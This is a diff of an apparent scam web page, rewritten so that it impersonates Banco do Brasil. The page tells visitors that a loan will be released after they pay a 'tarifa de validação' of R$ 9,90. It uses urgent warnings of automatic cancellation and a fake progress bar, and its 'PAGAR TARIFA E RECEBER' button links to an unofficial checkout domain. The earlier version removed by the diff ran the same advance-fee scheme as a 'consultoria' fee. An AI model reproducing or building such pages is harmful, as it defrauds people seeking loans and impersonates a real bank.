@@ -1,130 +1,163 @@
-<!DOCTYPE html><html lang="pt-br"><head>
-    
-<script>
-  window.pixelId = "68478c2e2058440e4c5174d0";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco do Brasil</title>
+  <link rel="preload" href="css/style.css" as="style">
+  <link rel="preload" href="css/slider.css" as="style">
+  <link rel="preload" href="css/animated.css" as="style">
+  <link rel="preload" href="css/notiflix-3.2.5.min.css" as="style">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/slider.css">
+  <link rel="stylesheet" href="css/animated.css">
+  <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+  <link rel="shortcut icon" href="images/faveicon.png">
+  <script>
+    window.pixelId = "68478c2e2058440e4c5174d0";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  
+      <script src="js/br.js" defer=""></script>
 
-<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Taxa de Consultoria Financeira</title>
-    <script src="js/lottie-player.js"></script>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f9f9fb;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-        .container {
-            max-width: 800px;
-            margin: 50px auto;
-            background-color: #ffffff;
-            padding: 50px;
-            border-radius: 10px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        h1 {
-            color: #2c3e50;
-            font-size: 36px;
-            margin-bottom: 30px;
-            font-weight: bold;
-        }
-        p {
-            font-size: 18px;
-            color: #7f8c8d;
-            line-height: 1.6;
-            margin-bottom: 30px;
-            font-weight: 500;
-        }
-        .cta-button {
-            background-color: #3354fd;
-            color: white;
-            padding: 16px 40px;
-            font-size: 20px;
-            text-decoration: none;
-            border-radius: 50px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-            transition: background-color 0.3s ease, transform 0.2s ease;
-        }
-        .cta-button:hover {
-            background-color: #c24c02;
-            transform: translateY(-4px);
-        }
-        .cta-button:active {
-            transform: translateY(2px);
-        }
-        .cta-button:focus {
-            outline: none;
-        }
-        .logo {
-            max-width: 90px;
-        }
-       .alert {
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 30px;
-            font-size: 16px;
-            font-weight: bold;
-            background-color: #fef8e7;
-            color: #b35900;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: left;
-            border: 2px solid #e0c29d;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        .alert p {
-            margin-left: 15px;
-            flex-grow: 1;
-        }
-        .alert lottie-player {
-            width: 50px;
-            height: 50px;
-        }
-        .message {
-            font-size: 20px;
-            color: #16a085;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-    </style>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      visibility: hidden;
+    }
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .alert {
+      font-size: 13px;
+      color: #842029;
+      border: 1px solid #f5c2c7;
+      padding: 10px;
+      background-color: #f8d7da;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+    .progress-container {
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+      height: 30px;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background-color: #3354fd;
+      color: #fff;
+      text-align: center;
+      line-height: 30px;
+      transition: width 0.4s ease;
+      font-weight: bold;
+    }
+    .btn {
+      display: block;
+      background-color: #3354fd;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .footer-logo {
+      margin-top: 30px;
+    }
+    #preloader {
+      background: #ffffff;
+      position: fixed;
+      z-index: 9999;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .tarifa-valor {
+      font-size: 16px;
+      font-weight: bold;
+      color: #3354fd;
+      margin-top: 20px;
+    }
+  </style>
 <script src="js/br.js" defer=""></script></head>
 <body>
+  <div id="preloader">
+    <img src="images/unnamed.png" alt="Carregando..." style="width: 50px;">
+  </div>
 
-    <div class="container">
-        <!-- Logo -->
-        <img src="images/images-2-removebg-preview.png" alt="Logo" class="logo">
-
-        <h1>Taxa de Consultoria Financeira</h1>
-        
-        <p>Estamos quase lá! A Taxa de Consultoria Financeira é um custo associado à análise e orientação personalizada do seu perfil para garantir que você obtenha o melhor empréstimo possível.</p>
-
-        <p>Com o pagamento dessa taxa, nossos especialistas financeiros irão finalizar a análise e dar o último passo para liberar o seu empréstimo.</p>
-
-        <div class="message">
-            <p><strong>Seu empréstimo está quase pronto!</strong> Não deixe de pagar a taxa para continuar com o processo e garantir a liberação.</p>
-        </div>
-
-        <!-- Mensagem de Atenção com Lottie -->
-        <div class="alert">
-            <lottie-player src="https://assets7.lottiefiles.com/packages/lf20_qznn5z7d.json" background="transparent.html" speed="1" loop="" autoplay=""></lottie-player>
-            <p><strong>Atenção:</strong> Sem o pagamento dessa taxa, o processo não poderá ser finalizado e o valor não será liberado.</p>
-        </div>
-
-        <!-- Redirecionamento para Google -->
-        <a href="https://pay.novopaggamentoseguro.com/checkout/f5ef1322-c804-4c5c-b50b-5c9cb10a1eb5" class="cta-button pagamentoBanco do Brasil">Pagar Agora</a>
+  <div class="container">
+    <div class="alert">
+      <strong>ATENÇÃO:</strong><br>
+      Caso o pagamento da tarifa não seja realizado nos próximos minutos, o empréstimo será automaticamente cancelado pelo sistema.
     </div>
+    <div class="progress-container">
+      <div id="myProgressBar" class="progress-bar">0%</div>
+    </div>
+    <img src="images/C-pia-de-Inserir-um-t-tulo-1.png" alt="Saque" style="width: 80%; max-width: 400px; margin: 20px auto;">
+    <p style="font-size: 14px;">
+      Para liberação, é necessário realizar o pagamento da tarifa de validação. Após o pagamento, o valor será transferido imediatamente para sua chave PIX.<br><br>
+      <strong>Evite o cancelamento automático e confirme agora.</strong>
+    </p>
 
+    <p class="tarifa-valor">Valor da tarifa: <strong>R$ 9,90</strong></p>
+
+    <a style="max-width:95%;text-decoration: none;" href="https://pay.pagamentosfacilitadosoficial.shop/yOeXZKlKzmxGAQa" class="btn pagamentoBanco do Brasil" id="paymentButton">PAGAR TARIFA E RECEBER</a>
+
+    <div class="footer-logo">
+      <img src="images/unnamed.png" alt="Banco do Brasil" style="width: 35px;">
+    </div>
+    <p style="font-size: 12px; color: gray; margin-top: 10px;">Banco do Brasil, 2025. Todos os direitos reservados.</p>
+  </div>
+
+  <script src="js/notiflix-3.2.5.min.js"></script>
+  <script>
+    function updateProgressBar() {
+      const progressBar = document.getElementById('myProgressBar');
+      let width = 0;
+      const interval = setInterval(() => {
+        if (width >= 90) {
+          clearInterval(interval);
+        } else {
+          width++;
+          progressBar.style.width = width + '%';
+          progressBar.textContent = width + '%';
+        }
+      }, 20);
+    }
+
+    window.onload = function () {
+      document.getElementById('preloader').style.display = 'none';
+      document.body.style.visibility = 'visible';
+      updateProgressBar();
+    };
+
+  
+  </script>
 
 
 </body></html>
